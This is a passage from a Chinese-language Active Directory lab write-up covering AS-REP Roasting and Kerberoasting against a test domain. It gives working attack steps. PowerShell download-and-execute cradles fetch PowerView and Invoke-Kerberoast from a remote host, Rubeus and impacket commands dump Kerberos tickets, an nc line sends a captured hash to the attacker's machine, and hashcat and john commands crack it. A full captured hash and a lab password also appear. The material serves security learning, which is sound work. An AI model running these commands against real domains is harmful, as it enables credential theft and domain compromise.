class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads\impacket-examples-windows-master\impacket-examples-windows-master&gt;getPac.exe  -targetUser administrator   training.local/Administrator:&quot;1qaz@WSX&quot;</span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line"></span><br><span class="line">KERB_VALIDATION_INFO</span><br><span class="line">LogonTime:</span><br><span class="line">    dwLowDateTime:                   2655966041L</span><br><span class="line">    dwHighDateTime:                  30846486</span><br><span class="line">LogoffTime:</span><br><span class="line">    dwLowDateTime:                   4294967295L</span><br><span class="line">    dwHighDateTime:                  2147483647</span><br><span class="line">KickOffTime:</span><br><span class="line">    dwLowDateTime:                   4294967295L</span><br><span class="line">    dwHighDateTime:                  2147483647</span><br><span class="line">PasswordLastSet:</span><br><span class="line">    dwLowDateTime:                   3982667011L</span><br><span class="line">    dwHighDateTime:                  30842451</span><br><span class="line">PasswordCanChange:</span><br><span class="line">    dwLowDateTime:                   399273219</span><br><span class="line">    dwHighDateTime:                  30842653</span><br><span class="line">PasswordMustChange:</span><br><span class="line">    dwLowDateTime:                   3803983107L</span><br><span class="line">    dwHighDateTime:                  30850900</span><br><span class="line">EffectiveName:                   u&apos;Administrator&apos;</span><br><span class="line">FullName:                        u&apos;&apos;</span><br><span class="line">LogonScript:                     u&apos;&apos;</span><br><span class="line">ProfilePath:                     u&apos;&apos;</span><br><span class="line">HomeDirectory:                   u&apos;&apos;</span><br><span class="line">HomeDirectoryDrive:              u&apos;&apos;</span><br><span class="line">LogonCount:                      49</span><br><span class="line">BadPasswordCount:                0</span><br><span class="line">UserId:                          500</span><br><span class="line">PrimaryGroupId:                  513</span><br><span class="line">GroupCount:                      5</span><br><span class="line">GroupIds:</span><br><span class="line">    [</span><br><span class="line"></span><br><span class="line">        RelativeId:                      520</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line"></span><br><span class="line">        RelativeId:                      513</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line"></span><br><span class="line">        RelativeId:                      512</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line"></span><br><span class="line">        RelativeId:                      518</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line"></span><br><span class="line">        RelativeId:                      519</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line">    ]</span><br><span class="line">UserFlags:                       544</span><br><span class="line">UserSessionKey:</span><br><span class="line">    Data:                            &apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">LogonServer:                     u&apos;DC01&apos;</span><br><span class="line">LogonDomainName:                 u&apos;TRAINING&apos;</span><br><span class="line">LogonDomainId:</span><br><span class="line">    Revision:                        1</span><br><span class="line">    SubAuthorityCount:               4</span><br><span class="line">    IdentifierAuthority:             &apos;\x00\x00\x00\x00\x00\x05&apos;</span><br><span class="line">    SubAuthority:</span><br><span class="line">        [</span><br><span class="line">             21,</span><br><span class="line">             2501991368L,</span><br><span class="line">             4163896689L,</span><br><span class="line">             842069156,</span><br><span class="line">        ]</span><br><span class="line">LMKey:                           &apos;\x00\x00\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">UserAccountControl:              16</span><br><span class="line">SubAuthStatus:                   0</span><br><span class="line">LastSuccessfulILogon:</span><br><span class="line">    dwLowDateTime:                   0</span><br><span class="line">    dwHighDateTime:                  0</span><br><span class="line">LastFailedILogon:</span><br><span class="line">    dwLowDateTime:                   0</span><br><span class="line">    dwHighDateTime:                  0</span><br><span class="line">FailedILogonCount:               0</span><br><span class="line">Reserved3:                       0</span><br><span class="line">SidCount:                        1</span><br><span class="line">ExtraSids:</span><br><span class="line">    [</span><br><span class="line"></span><br><span class="line">        Sid:</span><br><span class="line">            Revision:                        1</span><br><span class="line">            SubAuthorityCount:               1</span><br><span class="line">            IdentifierAuthority:             &apos;\x00\x00\x00\x00\x00\x12&apos;</span><br><span class="line">            SubAuthority:</span><br><span class="line">                [</span><br><span class="line">                     2,</span><br><span class="line">                ]</span><br><span class="line">        Attributes:                      7 ,</span><br><span class="line">    ]</span><br><span class="line">ResourceGroupDomainSid:</span><br><span class="line">    Revision:                        1</span><br><span class="line">    SubAuthorityCount:               4</span><br><span class="line">    IdentifierAuthority:             &apos;\x00\x00\x00\x00\x00\x05&apos;</span><br><span class="line">    SubAuthority:</span><br><span class="line">        [</span><br><span class="line">             21,</span><br><span class="line">             2501991368L,</span><br><span class="line">             4163896689L,</span><br><span class="line">             842069156,</span><br><span class="line">        ]</span><br><span class="line">ResourceGroupCount:              1</span><br><span class="line">ResourceGroupIds:</span><br><span class="line">    [</span><br><span class="line"></span><br><span class="line">        RelativeId:                      572</span><br><span class="line">        Attributes:                      536870919 ,</span><br><span class="line">    ]</span><br><span class="line">Domain SID: S-1-5-21-2501991368-4163896689-842069156</span><br></pre></td></tr></table></figure>
<p>其實針對每個 field 微軟的官方文件都有說明，但真的這樣子列不完….</p>
<p>有關 Kerberos 的科普就告一段落</p>
<p>相關資料參考:<br><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/authentication-service-exchange" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/secauthn/authentication-service-exchange</a><br><a href="https://zhuanlan.zhihu.com/p/89399579" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89399579</a><br><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf</a><br><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13</a><br><a href="https://blog.csdn.net/wy_97/article/details/87649262" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/87649262</a><br><a href="https://www.itread01.com/content/1547084522.html" target="_blank" rel="noopener">https://www.itread01.com/content/1547084522.html</a><br><a href="https://www.anquanke.com/post/id/192810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/192810</a><br><a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-PAC/%5bMS-PAC%5d.pdf" target="_blank" rel="noopener">https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-PAC/%5bMS-PAC%5d.pdf</a><br><a href="https://tools.ietf.org/id/draft-jaganathan-win-krb-authz-00.txt" target="_blank" rel="noopener">https://tools.ietf.org/id/draft-jaganathan-win-krb-authz-00.txt</a><br><a href="https://clickhouse.tech/codebrowser/html_report/ClickHouse/contrib/krb5/src/lib/krb5/krb/authdata.h.html" target="_blank" rel="noopener">https://clickhouse.tech/codebrowser/html_report/ClickHouse/contrib/krb5/src/lib/krb5/krb/authdata.h.html</a></p>
<hr>
<h1 id="LAB-2-AS-REP-Roasting"><a href="#LAB-2-AS-REP-Roasting" class="headerlink" title="LAB 2 - AS-REP Roasting"></a>LAB 2 - AS-REP Roasting</h1><hr>
<p><img src="/img/2020/windows_ad/windows_AD_ker_1.png" alt=""></p>
<p>During preauthentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request.  From there, the TGT will be issued for the user to use for future authentication.  If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline. Preauthentication is required by default in Active Directory.<br>ref:<a href="https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/" target="_blank" rel="noopener">https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/</a></p>
<p>簡單來說，預設的 AS-REQ 會以 A 使用者的 NTLM hash 加密 timestamp ，再交由 DC 解密做驗證，如果關閉 <code>preauthentication</code>, 則 AS-REQ 就不會先用 A 使用者的 NTLM hash 做加密了，這代表只要知道 username, 攻擊者可以偽裝 A 使用者對 DC 發出 AS-REQ, 而 DC 則不經確認的回傳以 A 使用者的 NTLM hash 加密過的 AS-REP 給攻擊者，攻擊者拿到後就可以進行離線爆破嘗試取得 A 使用者的密碼</p>
<h2 id="Quick-summary"><a href="#Quick-summary" class="headerlink" title="Quick summary"></a>Quick summary</h2><ul>
<li>We can request a user with pre-authentication disable without knowing its password </li>
<li>A part of response(as-rep) is encrypted by user’s hash </li>
<li>This section can be downgrade to RC4-HMAC in AS-request</li>
<li>We can extract this part from as-rep and crack it offline</li>
</ul>
<h2 id="Vuln-Settings-1"><a href="#Vuln-Settings-1" class="headerlink" title="Vuln Settings"></a>Vuln Settings</h2><h3 id="Disable-Pre-authentication"><a href="#Disable-Pre-authentication" class="headerlink" title="Disable Pre-authentication"></a>Disable Pre-authentication</h3><p><code>Windows Administrative Tools -&gt;  Active Directory Users and Computers (ADUC) -&gt; select &quot;RD Dept&quot; -&gt; select user -&gt; Properties -&gt; Accounts -&gt; enable &quot;Do not require Kerberos preauthentication&quot;</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab2_1.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab2_2.png" alt=""></p>
<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="powerview"><a href="#powerview" class="headerlink" title="powerview"></a>powerview</h3><p>一樣省略 <code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/PowerView.ps1&#39;)&quot;</code></p>
<h4 id="Get-domainuser"><a href="#Get-domainuser" class="headerlink" title="Get-domainuser"></a>Get-domainuser</h4><p><img src="/img/2020/windows_ad/windows_AD_lab2_3.png" alt=""></p>
<h4 id="Get-DomainUser-PreauthNotRequired"><a href="#Get-DomainUser-PreauthNotRequired" class="headerlink" title="Get-DomainUser -PreauthNotRequired"></a>Get-DomainUser -PreauthNotRequired</h4><p><img src="/img/2020/windows_ad/windows_AD_lab2_4.png" alt=""></p>
<h2 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h2><h3 id="Rubeus-set-client-as-target"><a href="#Rubeus-set-client-as-target" class="headerlink" title="Rubeus [set client as target]"></a>Rubeus [set client as target]</h3><p>不想 compiler 可以直接抓別人包好的 exe<br><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" rel="noopener">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab2_5.png" alt=""></p>
<p><code>.\Rubeus.exe asreproast /format:hashcat /outfile:hash</code><br>or <code>.\Rubeus.exe asreproast /user:AStar /format:hashcat /outfile:hash</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab2_6.png" alt=""></p>
<p>最後用 nc 傳一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\AStar\Downloads\hfs2.3b&gt;nc -w 3 192.168.43.140 1234 &lt; hash</span><br><span class="line">nc -w 3 192.168.43.140 1234 &lt; hash</span><br><span class="line"></span><br><span class="line">C:\Users\AStar\Downloads\hfs2.3b&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -l 1234 &gt; hash</span><br><span class="line">root@kali:~# cat hash</span><br><span class="line">$krb5asrep$23$AStar@training.local:EE0245AB1B37048B6D12EBC0E1387B17$51B1071F04A29E79C62D51E61638B07CE79539934E9D1B27D9BE056521786B9B9D07F251FA8E2FBA261E0E704A00AC5ECBE7479E7AE0F3A8CF2A44FAA6C0D8BF8A3F7389E0E82E8F3AE7149D3E3E52815F49C959A0F41E04EE251390E41F7C94A36825A11E46D29B973344EC2075B114172519DF80FCD9FC8B2431FC68934D5A4473C28A25A0C42BBDCC223AD895A8B79F45B605BDE886F7D7D4FDB2E57626865217E9C1C09D93313D82511246AB11E187F86A12F8CCC4947E927AAB4753CC220817CFC7D9E00035385AC6EC5FD4D160F1889E55800125552C270FA3DFAC77DC854C360C5D3D5A613F638AB1AE178597</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
<p>如果有開 pre-authentication 的話會出現這樣的結果</p>
<p><img src="/img/2020/windows_ad/windows_AD_lab2_10.png" alt=""></p>
<h3 id="GetNPUsers-impacket-set-AD-as-target-in-kali"><a href="#GetNPUsers-impacket-set-AD-as-target-in-kali" class="headerlink" title="GetNPUsers (impacket) [set AD as target (in kali)]"></a>GetNPUsers (impacket) [set AD as target (in kali)]</h3><p>impacket 有一包 example 很好用，在安裝的時候一併安裝進去<br>預設會將那包 example 放在 <code>/usr/share/doc/python3-impacket/examples/</code> (python3)</p>
<p><code>sudo pip3 install impacket</code><br><a href="https://pypi.org/project/impacket/" target="_blank" rel="noopener">https://pypi.org/project/impacket/</a></p>
<p><code>GetNPUsers.py  training.local/AStar -no-pass -dc-ip 192.168.43.147 -request | tail -n 1 &gt; hash</code><br><img src="/img/2020/windows_ad/windows_AD_lab2_7.png" alt=""></p>
<p>如果有開 pre-authentication 的話會出現這樣的結果<br><img src="/img/2020/windows_ad/windows_AD_lab2_11.png" alt=""></p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><p><code>hashcat -m 18200 ./hash /usr/share/wordlists/rockyou.txt --force</code><br><img src="/img/2020/windows_ad/windows_AD_lab2_8.png" alt=""></p>
<h3 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h3><p><code>john --wordlist=/usr/share/wordlists/rockyou.txt ./hash</code><br><img src="/img/2020/windows_ad/windows_AD_lab2_9.png" alt=""></p>
<hr>
<h1 id="LAB-3-Kerberoasting"><a href="#LAB-3-Kerberoasting" class="headerlink" title="LAB 3 - Kerberoasting"></a>LAB 3 - Kerberoasting</h1><hr>
<p><img src="/img/2020/windows_ad/windows_AD_ker_3.png" alt=""></p>
<p>要說 Lab 2 的目標是爆破使用者的密碼，那 Lab 3 就是嘗試爆破 <code>Service Account</code> 的密碼了，這裡主要是專注在 <code>User</code> 屬性的 Service Account<br>假設攻擊者已經打下一台 AD 網域下的主機，而該主機的使用者擁有訪問 A 服務的權限，攻擊者就可以利用該主機的使用者向 DC 發送 AS-REQ 取得 AS-REP,<br>取得 AS-REP 之後再發送 TGS-REQ, 然後 DC 回傳 TGS-REP, 到這邊，攻擊者已經取得透過該 <code>Service Account</code> 的 NTLM hash 加密過的 <code>Ticket</code> 了<br>攻擊者就可以嘗試離線爆破取得 <code>Service Account</code> 的密碼</p>
<h2 id="Service-Account"><a href="#Service-Account" class="headerlink" title="Service Account"></a>Service Account</h2><ul>
<li>Service Account 是一個使用者帳戶，被創造來為指定的服務提供<code>資訊安全內容</code> (security context)，可以用 <code>sc</code> 的指令看個別服務的 <code>security context</code> </li>
<li>Security context 定義了服務的權限，包含存取本地或是網路資源的權限</li>
</ul>
<p>Service Account 分為有四種，每一種對應到不同的 security context, 下圖的 <code>User</code> 就是正常能登入桌面的 user account, 其餘三種則是所謂的 <code>special accounts</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab3_1.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab3_3.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab3_2.png" alt=""></p>
<p>ref:<br><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts</a><br><a href="https://docs.microsoft.com/zh-tw/dotnet/framework/windows-services/how-to-specify-the-security-context-for-services" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/dotnet/framework/windows-services/how-to-specify-the-security-context-for-services</a><br><a href="https://docs.microsoft.com/zh-tw/dotnet/api/system.serviceprocess.serviceaccount?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/dotnet/api/system.serviceprocess.serviceaccount?view=netframework-4.8</a><br><a href="https://docs.microsoft.com/zh-tw/windows/win32/services/service-user-accounts?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/win32/services/service-user-accounts?redirectedfrom=MSDN</a></p>
<h2 id="Service-Principal-Names-SPN"><a href="#Service-Principal-Names-SPN" class="headerlink" title="Service Principal Names (SPN)"></a>Service Principal Names (SPN)</h2><p><a href="https://docs.microsoft.com/zh-tw/windows/win32/ad/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/win32/ad/service-principal-names</a></p>
<ul>
<li>SPN 是作為 Windows 服務實例 (service instance) 的唯一標示，假如有多個客戶端用不同的名字連接此服務進行驗證，則可能會有一個服務擁有多個 SPN 的情況，Kerberos 的驗證使用 SPN 將服務實例 (service instance) 與服務帳戶 (service logon account) 做關聯，這麼做讓 client 即使沒有任何帳號也能對服務進行驗證和 request</li>
<li>假如有多個客戶端用不同的名字連接此服務進行驗證，則可能會有一個服務擁有多個 SPN 的情況，只要確保 SPN 的值不重複即可，如果有重複的值則會導致 Kerberos 的驗證失敗</li>
<li>SPN 包含四個元素，兩個必需元素和兩個其他元素，可以根據需要使用這些元素來生成下表中列出的唯一名稱。<br><img src="/img/2020/windows_ad/windows_AD_lab3_4.png" alt=""></li>
</ul>
<p>可以使用內建指令 <code>setspn</code> 或是 <code>dsquery</code> 查看相關的 SPN</p>
<p><code>setspn -L &lt;server name&gt;(hostname on server)</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_5.png" alt=""></p>
<p><code>setspn -L &lt;domain\username&gt;</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_6.png" alt=""></p>
<p><code>dsquery * &quot;dc=training,dc=local&quot; -filter &quot;(&amp;(objectcategory=computer)(servicePrincipalName=*))&quot; -attr distinguishedName servicePrincipalName</code></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab3_7.png" alt=""><br>可以根據自身需求自行加 <code>ou</code> 和 <code>CN</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_8.png" alt=""></p>
<p>SPN 主要是會被包進 <code>TGT</code> 內作為驗證</p>
<h2 id="Four-steps-to-attack-Kerberos"><a href="#Four-steps-to-attack-Kerberos" class="headerlink" title="Four steps to attack Kerberos"></a>Four steps to attack Kerberos</h2><ol>
<li>Query the DC for accounts with an SPN</li>
<li>Request RC4 service tickets form the DC using these SPN values </li>
<li>Extract received Service Tickets and dump them to a file </li>
<li>Launch offline brute force attack against the tickets to recover the credential (NT hash/password) that was used to encrypt the Service Ticket </li>
</ol>
<ul>
<li>This attack is focused against “service accounts” rather than “computer accounts”, which passwords would be unfeasible to crack </li>
</ul>
<p>ref:<br><a href="https://docs.microsoft.com/zh-tw/windows/win32/ad/name-formats-for-unique-spns" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/win32/ad/name-formats-for-unique-spns</a><br><a href="https://docs.microsoft.com/zh-tw/windows/win32/ad/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/win32/ad/service-principal-names</a></p>
<h2 id="Create-service-accounts"><a href="#Create-service-accounts" class="headerlink" title="Create service accounts"></a>Create service accounts</h2><p>為了模擬我們的攻擊，我們需要先在AD創一個叫做 svc_account 的 <code>service account</code> 並且賦予他 SPN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $pass = ConvertTo-SecureString -string &apos;Password!&apos; -AsPlainText -Force</span><br><span class="line">PS C:\&gt; New-ADUser -Name &quot;svc_account&quot; -OtherAttributes @&#123;&apos;title&apos;=&quot;only for testing”;&apos;mail&apos;=&quot;svc_account@training.local&quot;&#125; -AccountPassword $pass -Enabled $True</span><br></pre></td></tr></table></figure>
<p>為這個 <code>service account</code> 註冊一個 SPN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-Aduser -identity svc_account -ServicePrincipalNames @&#123;Add=&quot;HTTP/pc01&quot;&#125;</span><br><span class="line">PS C:\&gt; Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members svc_account</span><br></pre></td></tr></table></figure>
<p>最後看一下設定是否正確<br><img src="/img/2020/windows_ad/windows_AD_lab3_9.png" alt=""><br><code>Get-ADUser -identity svc_account -properties ServicePrincipalName</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_10.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab3_11.png" alt=""></p>
<h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><p>in client env</p>
<h3 id="RSAT-1"><a href="#RSAT-1" class="headerlink" title="RSAT"></a>RSAT</h3><p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;import-module .\Microsoft.ActiveDirectory.Management.dll ; get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop *&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_12.png" alt=""></p>
<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\AStar\Downloads\hfs2.3b&gt; powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&apos;http://192.168.43.140:8000/PowerView.ps1&apos;); Get-NetUser -spn -AdminCount&quot;</span><br><span class="line">powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&apos;http://192.168.43.140:8000/PowerView.ps1&apos;); Get-NetUser -spn -AdminCount&quot;</span><br><span class="line"></span><br><span class="line">logoncount                    : 0</span><br><span class="line">iscriticalsystemobject        : True</span><br><span class="line">description                   : Key Distribution Center Service Account</span><br><span class="line">distinguishedname             : CN=krbtgt,CN=Users,DC=training,DC=local</span><br><span class="line">objectclass                   : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">name                          : krbtgt</span><br><span class="line">showinadvancedviewonly        : True</span><br><span class="line">objectsid                     : S-1-5-21-2501991368-4163896689-842069156-502</span><br><span class="line">samaccountname                : krbtgt</span><br><span class="line">admincount                    : 1</span><br><span class="line">codepage                      : 0</span><br><span class="line">samaccounttype                : USER_OBJECT</span><br><span class="line">accountexpires                : NEVER</span><br><span class="line">cn                            : krbtgt</span><br><span class="line">whenchanged                   : 2020/10/9 下午 04:12:05</span><br><span class="line">instancetype                  : 4</span><br><span class="line">usncreated                    : 12324</span><br><span class="line">objectguid                    : 33c297e3-f91d-4c0b-b8ab-9571dd07f85c</span><br><span class="line">lastlogoff                    : 1601/1/1 上午 08:00:00</span><br><span class="line">objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">dscorepropagationdata         : &#123;2020/10/10 下午 05:51:07, 2020/10/10 下午 05:43:14, 2020/10/10 下午 04:30:26, 2020/10/</span><br><span class="line">                                10 下午 04:23:38...&#125;</span><br><span class="line">serviceprincipalname          : kadmin/changepw</span><br><span class="line">memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">lastlogon                     : 1601/1/1 上午 08:00:00</span><br><span class="line">badpasswordtime               : 1601/1/1 上午 08:00:00</span><br><span class="line">badpwdcount                   : 0</span><br><span class="line">useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT</span><br><span class="line">whencreated                   : 2020/10/9 下午 03:42:38</span><br><span class="line">countrycode                   : 0</span><br><span class="line">primarygroupid                : 513</span><br><span class="line">pwdlastset                    : 2020/10/9 下午 11:42:38</span><br><span class="line">msds-supportedencryptiontypes : 0</span><br><span class="line">usnchanged                    : 16496</span><br><span class="line"></span><br><span class="line">logoncount            : 0</span><br><span class="line">badpasswordtime       : 1601/1/1 上午 08:00:00</span><br><span class="line">mail                  : svc_account@training.local</span><br><span class="line">distinguishedname     : CN=svc_account,CN=Users,DC=training,DC=local</span><br><span class="line">objectclass           : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">name                  : svc_account</span><br><span class="line">objectsid             : S-1-5-21-2501991368-4163896689-842069156-1107</span><br><span class="line">samaccountname        : svc_account</span><br><span class="line">admincount            : 1</span><br><span class="line">codepage              : 0</span><br><span class="line">samaccounttype        : USER_OBJECT</span><br><span class="line">accountexpires        : NEVER</span><br><span class="line">cn                    : svc_account</span><br><span class="line">whenchanged           : 2020/11/4 下午 08:52:52</span><br><span class="line">instancetype          : 4</span><br><span class="line">title                 : only for testing</span><br><span class="line">objectguid            : 406a2e18-b52d-49ce-87f1-86428849ef47</span><br><span class="line">lastlogoff            : 1601/1/1 上午 08:00:00</span><br><span class="line">objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=training,DC=local</span><br><span class="line">dscorepropagationdata : &#123;2020/11/4 下午 08:52:52, 1601/1/1 上午 12:00:00&#125;</span><br><span class="line">serviceprincipalname  : HTTP/pc01</span><br><span class="line">usncreated            : 57503</span><br><span class="line">memberof              : CN=Domain Admins,CN=Users,DC=training,DC=local</span><br><span class="line">lastlogon             : 1601/1/1 上午 08:00:00</span><br><span class="line">badpwdcount           : 0</span><br><span class="line">useraccountcontrol    : NORMAL_ACCOUNT</span><br><span class="line">whencreated           : 2020/11/4 下午 08:27:52</span><br><span class="line">countrycode           : 0</span><br><span class="line">primarygroupid        : 513</span><br><span class="line">pwdlastset            : 2020/11/5 上午 04:27:52</span><br><span class="line">usnchanged            : 61471</span><br></pre></td></tr></table></figure>
<h2 id="Dump-1"><a href="#Dump-1" class="headerlink" title="Dump"></a>Dump</h2><h3 id="Rubeus-set-client-as-target-1"><a href="#Rubeus-set-client-as-target-1" class="headerlink" title="Rubeus [set client as target]"></a>Rubeus [set client as target]</h3><p><code>.\Rubeus.exe kerberoast /user:svc_account /outfile:svc_account.tgs.enc</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_13.png" alt=""></p>
<h3 id="Invoke-Kerberoast-set-client-as-target"><a href="#Invoke-Kerberoast-set-client-as-target" class="headerlink" title="Invoke-Kerberoast [set client as target]"></a>Invoke-Kerberoast [set client as target]</h3><p>source: <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.EXAMPLE</span><br><span class="line">Invoke-Kerberoast | fl</span><br><span class="line">Kerberoasts all found SPNs for the current domain.</span><br><span class="line">.EXAMPLE</span><br><span class="line">Invoke-Kerberoast -Domain dev.testlab.local -OutputFormat HashCat | fl</span><br><span class="line">Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat</span><br><span class="line">format instead of John (the default).</span><br></pre></td></tr></table></figure>
<p><code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast | fl&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_16.png" alt=""></p>
